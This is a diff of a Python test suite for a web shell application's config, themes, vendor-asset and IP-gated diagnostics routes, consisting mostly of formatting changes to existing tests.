-                    "tour_enabled", "tour_version", "tour_chapter_count"):
+        for key in (
+            "command_timeout_seconds",
+            "welcome_char_ms",
+            "welcome_jitter_ms",
+            "welcome_post_cmd_ms",
+            "welcome_inter_block_ms",
+            "welcome_first_prompt_idle_ms",
+            "welcome_post_status_pause_ms",
+            "welcome_sample_count",
+            "welcome_status_labels",
+            "welcome_hint_interval_ms",
+            "welcome_hint_rotations",
+            "tour_enabled",
+            "tour_version",
+            "tour_chapter_count",
+        ):
             assert key in data, f"missing key: {key}"
 
     def test_all_new_keys_are_ints(self):
         client = get_client()
         data = json.loads(client.get("/config").data)
-        for key in ("command_timeout_seconds",
-                    "welcome_char_ms", "welcome_jitter_ms",
-                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
-                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
-                    "welcome_sample_count", "welcome_hint_interval_ms",
-                    "welcome_hint_rotations", "tour_version", "tour_chapter_count"):
+        for key in (
+            "command_timeout_seconds",
+            "welcome_char_ms",
+            "welcome_jitter_ms",
+            "welcome_post_cmd_ms",
+            "welcome_inter_block_ms",
+            "welcome_first_prompt_idle_ms",
+            "welcome_post_status_pause_ms",
+            "welcome_sample_count",
+            "welcome_hint_interval_ms",
+            "welcome_hint_rotations",
+            "tour_version",
+            "tour_chapter_count",
+        ):
             assert isinstance(data[key], int), f"{key} should be int, got {type(data[key])}"
         assert isinstance(data["tour_enabled"], bool)
         assert isinstance(data["welcome_status_labels"], list)
@@ -14222,19 +14476,25 @@ class TestConfigRoute:
 
     def test_diag_enabled_uses_trusted_forwarded_for_when_present(self):
         client = get_client(use_forwarded_for=True)
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
-            "trusted_proxy_cidrs": ["127.0.0.1/32"],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
+                "trusted_proxy_cidrs": ["127.0.0.1/32"],
+            },
+        ):
             data = json.loads(client.get("/config").data)
         assert data["diag_enabled"] is True
 
     def test_diag_enabled_ignores_forwarded_for_from_untrusted_peer(self):
         client = get_client(use_forwarded_for=True)
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
-            "trusted_proxy_cidrs": ["10.0.0.0/8"],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
+                "trusted_proxy_cidrs": ["10.0.0.0/8"],
+            },
+        ):
             data = json.loads(client.get("/config").data)
         assert data["diag_enabled"] is False
 
@@ -14243,10 +14503,13 @@ class TestConfigRoute:
         rules = [
             {"label": "bearer", "pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": "i"},
         ]
-        with mock.patch.dict("config.CFG", {
-            "share_redaction_enabled": True,
-            "share_redaction_rules": rules,
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "share_redaction_enabled": True,
+                "share_redaction_rules": rules,
+            },
+        ):
             data = json.loads(client.get("/config").data)
         assert data["share_redaction_enabled"] is True
         assert any(rule["label"] == "bearer token" for rule in data["share_redaction_rules"])
@@ -14254,18 +14517,22 @@ class TestConfigRoute:
 
     def test_share_redaction_rules_empty_when_disabled(self):
         client = get_client()
-        with mock.patch.dict("config.CFG", {
-            "share_redaction_enabled": False,
-            "share_redaction_rules": [
-                {"label": "custom", "pattern": "internal", "replacement": "[custom]"},
-            ],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "share_redaction_enabled": False,
+                "share_redaction_rules": [
+                    {"label": "custom", "pattern": "internal", "replacement": "[custom]"},
+                ],
+            },
+        ):
             data = json.loads(client.get("/config").data)
         assert data["share_redaction_enabled"] is False
         assert data["share_redaction_rules"] == []
 
 
 # ── /themes ──────────────────────────────────────────────────────────────────
+
 
 class TestThemesRoute:
     def test_returns_200(self):
@@ -14343,6 +14610,7 @@ class TestThemesRoute:
 
 
 # ── /vendor assets ───────────────────────────────────────────────────────────
+
 
 class TestVendorAssets:
     @staticmethod
@@ -14548,6 +14816,7 @@ class TestVendorAssets:
 
 # ── /diag ─────────────────────────────────────────────────────────────────────
 
+
 class TestDiagRoute:
     """Operator diagnostics endpoint — IP-gated, returns 404 when unconfigured."""
 
@@ -14635,10 +14904,13 @@ class TestDiagRoute:
 
     def test_bundle_mode_renders_diag_css_bundles(self):
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "asset_bundle_mode": "bundle",
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "asset_bundle_mode": "bundle",
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+            },
+        ):
             body = client.get("/diag").get_data(as_text=True)
         _assert_html_document_contract(
             body,
@@ -14648,13 +14920,13 @@ class TestDiagRoute:
         assert re.search(r'href="/static/build/app\.[a-f0-9]{12}\.css"', body)
         assert re.search(r'href="/static/build/terminal-export\.[a-f0-9]{12}\.css"', body)
         assert re.search(r'href="/static/build/diag\.[a-f0-9]{12}\.css"', body)
-        assert '/static/css/core/base.css?v=' not in body
-        assert '/static/css/terminal_export.css?v=' not in body
-        assert '/static/css/diag.css?v=' not in body
+        assert "/static/css/core/base.css?v=" not in body
+        assert "/static/css/terminal_export.css?v=" not in body
+        assert "/static/css/diag.css?v=" not in body
         diag_css = (Path(__file__).resolve().parents[2] / "app/static/css/diag.css").read_text()
         assert '"raw      raw      raw      raw"' in diag_css
         assert '"raw       raw"' in diag_css
-        assert '.diag-section.s-raw-packets { grid-area: raw; }' in diag_css
+        assert ".diag-section.s-raw-packets { grid-area: raw; }" in diag_css
 
     def test_response_has_expected_top_level_keys(self):
         client = self._allowed_client()
@@ -14664,10 +14936,13 @@ class TestDiagRoute:
 
     def test_app_section_has_version_and_name(self):
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "app_name": "test shell",
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                "app_name": "test shell",
+            },
+        ):
             data = json.loads(client.get("/diag?format=json").data)
         assert data["app"]["name"] == "test shell"
         assert isinstance(data["app"]["version"], str)
@@ -14677,12 +14952,23 @@ class TestDiagRoute:
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
             data = json.loads(client.get("/diag?format=json").data)
         cfg = data["config"]
-        for key in ("rate_limit_enabled", "command_timeout_seconds", "max_output_lines",
-                    "high_volume_output_line_threshold", "high_volume_output_status_interval_lines",
-                    "interactive_pty_input_max_bytes", "interactive_pty_control_poll_seconds",
-                    "persist_full_run_output", "permalink_retention_days",
-                    "share_redaction_enabled", "custom_redaction_rule_count",
-                    "ai_enabled", "ai_provider", "ai_model", "ai_max_queue_depth"):
+        for key in (
+            "rate_limit_enabled",
+            "command_timeout_seconds",
+            "max_output_lines",
+            "high_volume_output_line_threshold",
+            "high_volume_output_status_interval_lines",
+            "interactive_pty_input_max_bytes",
+            "interactive_pty_control_poll_seconds",
+            "persist_full_run_output",
+            "permalink_retention_days",
+            "share_redaction_enabled",
+            "custom_redaction_rule_count",
+            "ai_enabled",
+            "ai_provider",
+            "ai_model",
+            "ai_max_queue_depth",
+        ):
             assert key in cfg, f"missing config key: {key}"
 
     def test_pty_section_contains_operator_metrics(self):
@@ -14712,10 +14998,12 @@ class TestDiagRoute:
         }
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
             data = json.loads(client.get("/diag", query_string=query).data)
-            fast_data = json.loads(client.get(
-                "/diag/classifier-inspector",
-                query_string={key: value for key, value in query.items() if key != "format"},
-            ).data)
+            fast_data = json.loads(
+                client.get(
+                    "/diag/classifier-inspector",
+                    query_string={key: value for key, value in query.items() if key != "format"},
+                ).data
+            )
             with mock.patch(
                 "services.assets.diagnostics.classifier_drift_report",
                 return_value={
@@ -14728,10 +15016,12 @@ class TestDiagRoute:
                     "runs": [],
                 },
             ) as drift_report:
-                drift_data = json.loads(client.get(
-                    "/diag/classifier-drift",
-                    query_string={"runs": "2", "lines": "10", "root": "nmap"},
-                ).data)
+                drift_data = json.loads(
+                    client.get(
+                        "/diag/classifier-drift",
+                        query_string={"runs": "2", "lines": "10", "root": "nmap"},
+                    ).data
+                )
             body = client.get(
                 "/diag",
                 query_string={key: value for key, value in query.items() if key != "format"},
@@ -14764,18 +15054,20 @@ class TestDiagRoute:
 
         class DriftRows:
             def fetchall(self):
-                return [{
-                    "id": "run-drift",
-                    "session_id": "sess-drift",
-                    "command": "masscan -p 80 192.168.1.3",
-                    "run_kind": "external",
-                    "output": "[]",
-                    "output_preview": "",
-                    "preview_truncated": False,
-                    "full_output_available": False,
-                    "full_output_truncated": False,
-                    "rel_path": None,
-                }]
+                return [
+                    {
+                        "id": "run-drift",
+                        "session_id": "sess-drift",
+                        "command": "masscan -p 80 192.168.1.3",
+                        "run_kind": "external",
+                        "output": "[]",
+                        "output_preview": "",
+                        "preview_truncated": False,
+                        "full_output_available": False,
+                        "full_output_truncated": False,
+                        "rel_path": None,
+                    }
+                ]
 
         class DriftConn:
             def execute(self, *_args, **_kwargs):
@@ -14795,10 +15087,7 @@ class TestDiagRoute:
         assert report["lines_sampled"] == 1
         drift_buckets = report["buckets"]
         assert isinstance(drift_buckets, list)
-        assert any(
-            isinstance(bucket, dict) and bucket["key"] == "metadata_changed"
-            for bucket in drift_buckets
-        )
+        assert any(isinstance(bucket, dict) and bucket["key"] == "metadata_changed" for bucket in drift_buckets)
 
     def test_every_config_key_belongs_to_a_group(self):
         """Drift guard: every key emitted into result['config'] must be
@@ -14822,9 +15111,7 @@ class TestDiagRoute:
         assert data["raw_packets"]["reason"] == "disabled"
         assert set(data["raw_packets"]["tools"]) == {"nmap", "naabu", "masscan"}
         missing_from_groups = emitted - grouped
-        assert not missing_from_groups, (
-            f"config keys not in any group (would be invisible on /diag): {missing_from_groups}"
-        )
+        assert not missing_from_groups, f"config keys not in any group (would be invisible on /diag): {missing_from_groups}"
 
         ready = {
             "linux": True,
@@ -14860,7 +15147,7 @@ class TestDiagRoute:
         assert ready_data["raw_packets"]["reason"] == "ready"
         assert re.search(r'class="diag-ok">ready</span>', ready_body)
         for tool in ("nmap", "naabu", "masscan"):
-            assert re.search(fr'class="diag-ok">{tool} ready</span>', ready_body)
+            assert re.search(rf'class="diag-ok">{tool} ready</span>', ready_body)
 
         restricted_cfg = {
             **enabled_cfg,
@@ -14883,11 +15170,9 @@ class TestDiagRoute:
         assert mixed_data["raw_packets"]["tools"]["nmap"]["reason"] == "ready"
         for tool in ("naabu", "masscan"):
             assert mixed_data["raw_packets"]["tools"][tool]["active"] is False
-            assert mixed_data["raw_packets"]["tools"][tool]["reason"] == (
-                "packet_socket_egress_policy_required"
-            )
+            assert mixed_data["raw_packets"]["tools"][tool]["reason"] == ("packet_socket_egress_policy_required")
             assert re.search(
-                fr'class="diag-muted">{tool} packet socket egress policy required</span>',
+                rf'class="diag-muted">{tool} packet socket egress policy required</span>',
                 mixed_body,
             )
 
@@ -14922,10 +15207,12 @@ class TestDiagRoute:
     def test_ai_test_route_runs_prompt_and_rate_limits_repeats(self):
         client = self._allowed_client()
         shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.clear()
-        shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.update({
-            "198.51.100.10": 900.0,
-            "198.51.100.11": 980.0,
-        })
+        shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.update(
+            {
+                "198.51.100.10": 900.0,
+                "198.51.100.11": 980.0,
+            }
+        )
         payload = {"ok": True, "payload": {"status": "ok", "message": "pong"}}
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
             with mock.patch("blueprints.assets.ai_run_test_prompt", return_value=payload) as test_prompt:
@@ -14998,9 +15285,9 @@ class TestDiagRoute:
             data = json.loads(client.get("/diag?format=json").data)
         assert "configured" in data["redis"]
 
-    def _fake_redis_client(self, *, ping_exc=None, scan_keys=None, info_data=None,
-                           sismember_map=None, get_map=None, dbsize=None,
-                           xlen_map=None):
+    def _fake_redis_client(
+        self, *, ping_exc=None, scan_keys=None, info_data=None, sismember_map=None, get_map=None, dbsize=None, xlen_map=None
+    ):
         """Build a MagicMock that mimics the redis-py methods _diag_redis_stats uses."""
         scan_keys = scan_keys or {}
         info_data = info_data or {}
@@ -15013,19 +15300,16 @@ class TestDiagRoute:
             fake.ping.return_value = True
         else:
             fake.ping.side_effect = ping_exc
-        fake.dbsize.return_value = dbsize if dbsize is not None else sum(
-            len(keys) for keys in scan_keys.values()
-        )
+        fake.dbsize.return_value = dbsize if dbsize is not None else sum(len(keys) for keys in scan_keys.values())
 
         def scan(cursor=0, match=None, count=None):  # noqa: ARG001
             keys = scan_keys.get(match, [])
             return (0, list(keys))
+
         fake.scan.side_effect = scan
         fake.xlen.side_effect = lambda key: xlen_map.get(key, 0)
         fake.get.side_effect = lambda key: get_map.get(key)
-        fake.sismember.side_effect = lambda key, member: bool(
-            member in sismember_map.get(key, set())
-        )
+        fake.sismember.side_effect = lambda key, member: bool(member in sismember_map.get(key, set()))
         fake.info.side_effect = lambda section: info_data.get(section, {})
         return fake
 
@@ -15035,21 +15319,24 @@ class TestDiagRoute:
         meta_payload = json.dumps({"session_id": "s1", "run_id": run_id})
         fake = self._fake_redis_client(
             scan_keys={
-                "runstream:*":     [f"runstream:{run_id}"],
-                "proc:*":          [f"proc:{run_id}"],
-                "procmeta:*":      [f"procmeta:{run_id}"],
-                "sessionprocs:*":  ["sessionprocs:s1"],
+                "runstream:*": [f"runstream:{run_id}"],
+                "proc:*": [f"proc:{run_id}"],
+                "procmeta:*": [f"procmeta:{run_id}"],
+                "sessionprocs:*": ["sessionprocs:s1"],
             },
             xlen_map={f"runstream:{run_id}": 17},
             get_map={f"procmeta:{run_id}": meta_payload, f"proc:{run_id}": "123"},
             sismember_map={"sessionprocs:s1": {run_id}},
             info_data={
-                "memory":      {"used_memory_human": "1.2M", "used_memory_peak_human": "2.0M",
-                                "maxmemory_human": "0", "mem_fragmentation_ratio": 1.05},
-                "persistence": {"aof_enabled": 1, "rdb_last_save_time": int(time.time()) - 90,
-                                "rdb_changes_since_last_save": 4},
-                "stats":       {"evicted_keys": 0, "expired_keys": 12},
-                "clients":     {"connected_clients": 3, "rejected_connections": 0},
+                "memory": {
+                    "used_memory_human": "1.2M",
+                    "used_memory_peak_human": "2.0M",
+                    "maxmemory_human": "0",
+                    "mem_fragmentation_ratio": 1.05,
+                },
+                "persistence": {"aof_enabled": 1, "rdb_last_save_time": int(time.time()) - 90, "rdb_changes_since_last_save": 4},
+                "stats": {"evicted_keys": 0, "expired_keys": 12},
+                "clients": {"connected_clients": 3, "rejected_connections": 0},
             },
         )
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
@@ -15093,9 +15380,9 @@ class TestDiagRoute:
         # procmeta:r2 references session s2, but sessionprocs:s2 has no member r2 → orphan.
         fake = self._fake_redis_client(
             scan_keys={
-                "runstream:*":    [],
-                "proc:*":         [],
-                "procmeta:*":     ["procmeta:r2"],
+                "runstream:*": [],
+                "proc:*": [],
+                "procmeta:*": ["procmeta:r2"],
                 "sessionprocs:*": ["sessionprocs:s2"],
             },
             get_map={"procmeta:r2": json.dumps({"session_id": "s2", "run_id": "r2"})},
@@ -15115,17 +15402,16 @@ class TestDiagRoute:
         many_streams = [f"runstream:r{i}" for i in range(cap + 5)]
         fake = self._fake_redis_client(
             scan_keys={
-                "runstream:*":    many_streams,
-                "proc:*":         [],
-                "procmeta:*":     [],
+                "runstream:*": many_streams,
+                "proc:*": [],
+                "procmeta:*": [],
                 "sessionprocs:*": [],
             },
         )
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
             with mock.patch.object(shell_assets, "redis_client", fake):
                 data = json.loads(client.get("/diag?format=json").data)
-        runstream_ns = next(ns for ns in data["redis"]["stats"]["namespaces"]
-                            if ns["name"] == "runstream")
+        runstream_ns = next(ns for ns in data["redis"]["stats"]["namespaces"] if ns["name"] == "runstream")
         assert runstream_ns["capped"] is True
         assert runstream_ns["count"] == cap
 
@@ -15137,9 +15423,17 @@ class TestDiagRoute:
         broker = data["broker"]
         assert broker["mode"] == "in_process"
         assert "fallback" in broker
-        for key in ("streams", "active", "closed", "expired_pending_purge",
-                    "events", "bytes", "pid_count", "active_run_count",
-                    "session_count"):
+        for key in (
+            "streams",
+            "active",
+            "closed",
+            "expired_pending_purge",
+            "events",
+            "bytes",
+            "pid_count",
+            "active_run_count",
+            "session_count",
+        ):
             assert key in broker["fallback"], f"missing fallback key: {key}"
 
     def test_broker_section_omits_fallback_when_redis_configured(self):
@@ -15156,10 +15450,13 @@ class TestDiagRoute:
 
     def test_broker_section_reports_unavailable_when_disabled(self):
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "run_broker_enabled": False,
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                "run_broker_enabled": False,
+            },
+        ):
             data = json.loads(client.get("/diag?format=json").data)
         broker = data["broker"]
         assert broker["available"] is False
@@ -15170,6 +15467,7 @@ class TestDiagRoute:
         # Publish two events to the in-memory store so the snapshot is non-empty.
         # Use a dedicated module import to avoid leaking state across tests.
         import services.runs.broker as shell_broker
+
         run_id = f"diag-test-{uuid.uuid4().hex}"
         try:
             shell_broker._memory_store.publish(run_id, "stdout", {"line": "hi"})
@@ -15209,7 +15507,12 @@ class TestDiagRoute:
             data = json.loads(client.get("/diag?format=json").data)
         # SQLite returns one of: delete, truncate, persist, memory, wal, off.
         assert data["db"]["journal_mode"] in {
-            "delete", "truncate", "persist", "memory", "wal", "off",
+            "delete",
+            "truncate",
+            "persist",
+            "memory",
+            "wal",
+            "off",
         }
 
     def test_db_section_reports_freelist_and_reclaimable_bytes(self):
@@ -15233,9 +15536,7 @@ class TestDiagRoute:
         # Core schema tables are present and FTS5 shadow tables are not.
         assert "runs" in names
         assert not any(name.startswith("sqlite_") for name in names)
-        assert not any(name.startswith("runs_fts_") for name in names), (
-            f"FTS5 shadow tables leaked into the table list: {names}"
-        )
+        assert not any(name.startswith("runs_fts_") for name in names), f"FTS5 shadow tables leaked into the table list: {names}"
         for entry in tables:
             assert isinstance(entry["name"], str) and entry["name"]
             assert isinstance(entry["rows"], int) and entry["rows"] >= 0
@@ -15268,28 +15569,25 @@ class TestDiagRoute:
                 "run_id TEXT PRIMARY KEY, rel_path TEXT NOT NULL, compression TEXT NOT NULL, byte_size INTEGER NOT NULL)"
             )
             conn.execute(
-                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
-                "VALUES (?, ?, ?, ?, ?)",
+                "INSERT INTO runs (id, command, output, output_preview, output_search_text) VALUES (?, ?, ?, ?, ?)",
                 ("run-a", "dig darklab.sh", "abc", "de", "fghi"),
             )
             conn.execute(
-                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size) "
-                "VALUES (?, ?, ?, ?)",
+                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size) VALUES (?, ?, ?, ?)",
                 ("run-a", "out.gz", "gzip", 128),
             )
             conn.commit()
-            storage = shell_assets._diag_table_storage_breakdown(conn, {
-                "runs": 1,
-                "run_output_artifacts": 1,
-            })
+            storage = shell_assets._diag_table_storage_breakdown(
+                conn,
+                {
+                    "runs": 1,
+                    "run_output_artifacts": 1,
+                },
+            )
 
-        run_entry = next(
-            row for bucket in storage["buckets"] for row in bucket["rows"]
-            if row["name"] == "runs"
-        )
+        run_entry = next(row for bucket in storage["buckets"] for row in bucket["rows"] if row["name"] == "runs")
         artifact_entry = next(
-            row for bucket in storage["buckets"] for row in bucket["rows"]
-            if row["name"] == "run_output_artifacts"
+            row for bucket in storage["buckets"] for row in bucket["rows"] if row["name"] == "run_output_artifacts"
         )
         assert run_entry["logical_payload"] == len("dig darklab.sh") + len("abc") + len("de") + len("fghi")
         assert artifact_entry["logical_payload"] == len("out.gz") + len("gzip") + 128
@@ -15298,12 +15596,10 @@ class TestDiagRoute:
         without_output_path = tmp_path / "diag_storage_payload_without_output.db"
         with sqlite3.connect(without_output_path) as conn:
             conn.execute(
-                "CREATE TABLE runs ("
-                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output_preview TEXT, output_search_text TEXT)"
+                "CREATE TABLE runs (id TEXT PRIMARY KEY, command TEXT NOT NULL, output_preview TEXT, output_search_text TEXT)"
             )
             conn.execute(
-                "INSERT INTO runs (id, command, output_preview, output_search_text) "
-                "VALUES (?, ?, ?, ?)",
+                "INSERT INTO runs (id, command, output_preview, output_search_text) VALUES (?, ?, ?, ?)",
                 ("run-b", "host darklab.sh", "preview", "search"),
             )
             conn.commit()
@@ -15322,12 +15618,10 @@ class TestDiagRoute:
                 "output_preview TEXT, output_search_text TEXT)"
             )
             conn.execute(
-                "CREATE VIRTUAL TABLE runs_fts USING fts5("
-                "command, output_search_text, content=runs, content_rowid=rowid)"
+                "CREATE VIRTUAL TABLE runs_fts USING fts5(command, output_search_text, content=runs, content_rowid=rowid)"
             )
             conn.execute(
-                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
-                "VALUES (?, ?, ?, ?, ?)",
+                "INSERT INTO runs (id, command, output, output_preview, output_search_text) VALUES (?, ?, ?, ?, ?)",
                 ("run-fts", "host darklab.sh", "", "", "104.21.4.35"),
             )
             rowid = conn.execute("SELECT rowid FROM runs WHERE id = ?", ("run-fts",)).fetchone()[0]
@@ -15340,10 +15634,7 @@ class TestDiagRoute:
 
         if not storage["dbstat_available"]:
             pytest.skip("SQLite dbstat virtual table is unavailable")
-        fts_entry = next(
-            row for bucket in storage["buckets"] for row in bucket["rows"]
-            if row["name"] == "runs_fts"
-        )
+        fts_entry = next(row for bucket in storage["buckets"] for row in bucket["rows"] if row["name"] == "runs_fts")
         assert fts_entry["kind"] == "virtual-table"
         assert {shadow["name"] for shadow in fts_entry["shadows"]} >= {
             "runs_fts_data",
@@ -15376,17 +15667,13 @@ class TestDiagRoute:
                 "output_preview TEXT, output_search_text TEXT)"
             )
             conn.execute(
-                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
-                "VALUES (?, ?, ?, ?, ?)",
+                "INSERT INTO runs (id, command, output, output_preview, output_search_text) VALUES (?, ?, ?, ?, ?)",
                 ("run-no-dbstat", "whois darklab.sh", "abc", "", "abc"),
             )
             conn.commit()
             storage = shell_assets._diag_table_storage_breakdown(_NoDbstatConn(conn), {"runs": 1})
 
-        run_entry = next(
-            row for bucket in storage["buckets"] for row in bucket["rows"]
-            if row["name"] == "runs"
-        )
+        run_entry = next(row for bucket in storage["buckets"] for row in bucket["rows"] if row["name"] == "runs")
         assert storage["dbstat_available"] is False
         assert run_entry["allocated_human"] == "—"
         assert run_entry["logical_payload"] == len("whois darklab.sh") + len("abc") + len("abc")
@@ -15410,8 +15697,10 @@ class TestDiagRoute:
         def connect_tmp_db():
             return sqlite3.connect(db_path)
 
-        with mock.patch.object(assets_diagnostics, "_database_path", return_value=db_path), \
-             mock.patch.object(assets_diagnostics, "_database_context", connect_tmp_db):
+        with (
+            mock.patch.object(assets_diagnostics, "_database_path", return_value=db_path),
+            mock.patch.object(assets_diagnostics, "_database_context", connect_tmp_db),
+        ):
             info = shell_assets._diag_db_stats()
 
         assert {"name": 'odd"table', "rows": 2} in info["tables"]
@@ -15433,9 +15722,7 @@ class TestDiagRoute:
         assert isinstance(data["db"]["runs"], int)
         assert isinstance(data["db"]["snapshots"], int)
         # Match the per-table row count.
-        runs_in_table = next(
-            (t["rows"] for t in data["db"]["tables"] if t["name"] == "runs"), None
-        )
+        runs_in_table = next((t["rows"] for t in data["db"]["tables"] if t["name"] == "runs"), None)
         assert data["db"]["runs"] == runs_in_table
 
     def test_db_section_reports_fts_orphan_count(self):
@@ -15448,14 +15735,9 @@ class TestDiagRoute:
     def test_db_fts_orphan_probe_uses_sqlite_rowid_not_uuid_id(self, tmp_path):
         db_path = tmp_path / "diag_fts.db"
         with sqlite3.connect(db_path) as conn:
+            conn.execute("CREATE TABLE runs (id TEXT PRIMARY KEY, command TEXT NOT NULL, output_search_text TEXT)")
             conn.execute(
-                "CREATE TABLE runs ("
-                "id TEXT PRIMARY KEY, command TEXT NOT NULL, "
-                "output_search_text TEXT)"
-            )
-            conn.execute(
-                "CREATE VIRTUAL TABLE runs_fts USING fts5("
-                "command, output_search_text, content=runs, content_rowid=rowid)"
+                "CREATE VIRTUAL TABLE runs_fts USING fts5(command, output_search_text, content=runs, content_rowid=rowid)"
             )
             conn.execute(
                 "INSERT INTO runs (id, command, output_search_text) VALUES (?, ?, ?)",
@@ -15466,8 +15748,7 @@ class TestDiagRoute:
                 ("run-uuid-1",),
             ).fetchone()[0]
             conn.execute(
-                "INSERT INTO runs_fts(rowid, command, output_search_text) "
-                "VALUES (?, ?, ?)",
+                "INSERT INTO runs_fts(rowid, command, output_search_text) VALUES (?, ?, ?)",
                 (rowid, "ping darklab.sh", "ok"),
             )
             conn.commit()
@@ -15475,8 +15756,10 @@ class TestDiagRoute:
         def connect_tmp_db():
             return sqlite3.connect(db_path)
 
-        with mock.patch.object(assets_diagnostics, "_database_path", return_value=db_path), \
-             mock.patch.object(assets_diagnostics, "_database_context", connect_tmp_db):
+        with (
+            mock.patch.object(assets_diagnostics, "_database_path", return_value=db_path),
+            mock.patch.object(assets_diagnostics, "_database_context", connect_tmp_db),
+        ):
             info = shell_assets._diag_db_stats()
 
         assert info["runs"] == 1
@@ -15537,9 +15820,7 @@ class TestDiagRoute:
             direct = client.get(entry["url"])
             assert direct.status_code == 200
             served_size = int(direct.headers.get("Content-Length") or len(direct.data))
-            assert entry["size"] == served_size, (
-                f"{label} probe size {entry['size']} != served size {served_size}"
-            )
+            assert entry["size"] == served_size, f"{label} probe size {entry['size']} != served size {served_size}"
 
     def test_assets_probe_reports_size_human_in_short_form(self):
         client = self._allowed_client()
@@ -15548,9 +15829,7 @@ class TestDiagRoute:
         for label in ("ansi_up", "jspdf", "fonts"):
             human = data["assets"][label]["size_human"]
             assert human, f"{label} probe missing size_human"
-            assert any(human.endswith(unit) for unit in (" B", " KB", " MB", " GB")), (
-                f"unexpected size_human format: {human!r}"
-            )
+            assert any(human.endswith(unit) for unit in (" B", " KB", " MB", " GB")), f"unexpected size_human format: {human!r}"
 
     def test_diag_fmt_bytes_buckets(self):
         f = shell_assets._diag_fmt_bytes
@@ -15578,11 +15857,10 @@ class TestDiagRoute:
         assert isinstance(present, list)
         # Every entry in present is a dict with a name that resolves via which()
         import shutil as _shutil
+
         for entry in present:
             assert isinstance(entry, dict), f"present entry is not a dict: {entry!r}"
-            assert _shutil.which(entry["name"]) is not None, (
-                f"{entry['name']} in present but not found by which()"
-            )
+            assert _shutil.which(entry["name"]) is not None, f"{entry['name']} in present but not found by which()"
 
     def test_tools_present_entries_carry_name_and_path_only(self):
         client = self._allowed_client()
@@ -15627,19 +15905,25 @@ class TestDiagRoute:
 
     def test_honors_forwarded_for_header_from_trusted_proxy(self):
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
-            "trusted_proxy_cidrs": ["127.0.0.1/32"],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
+                "trusted_proxy_cidrs": ["127.0.0.1/32"],
+            },
+        ):
             resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
         assert resp.status_code == 200
 
     def test_ignores_forwarded_for_header_from_untrusted_proxy(self):
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
-            "trusted_proxy_cidrs": ["192.0.2.0/24"],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
+                "trusted_proxy_cidrs": ["192.0.2.0/24"],
+            },
+        ):
             resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
         assert resp.status_code == 404
 
@@ -15664,10 +15948,13 @@ class TestDiagRoute:
         client = self._allowed_client()
         team_id = f"team_diag_html_{uuid.uuid4().hex}"
         target_id = self._record_audit_event(team_id=team_id)
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "audit_log_enabled": False,
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                "audit_log_enabled": False,
+            },
+        ):
             resp = client.get(f"/diag/audit?target_id={target_id}")
         body = resp.get_data(as_text=True)
         assert resp.status_code == 200
@@ -15698,8 +15985,8 @@ class TestDiagRoute:
         assert '<td class="diag-audit-scope">' in body
         assert f'<span class="diag-muted diag-audit-team-id" title="{team_id}">· {team_id}</span>' in body
         assert '<details class="diag-audit-details">' in body
-        assert '<summary>details</summary>' in body
-        assert '<pre>{' in body
+        assert "<summary>details</summary>" in body
+        assert "<pre>{" in body
         assert "entity.delete - entity deletion" in body
         assert "entity.suppress - entity suppression" in body
         assert "history.delete - run deletion" in body
@@ -15833,10 +16120,13 @@ class TestDiagRoute:
             correlation_id=correlation_id,
             created=f"{audit_date_text}T12:00:04+00:00",
         )
-        with mock.patch.dict("config.CFG", {
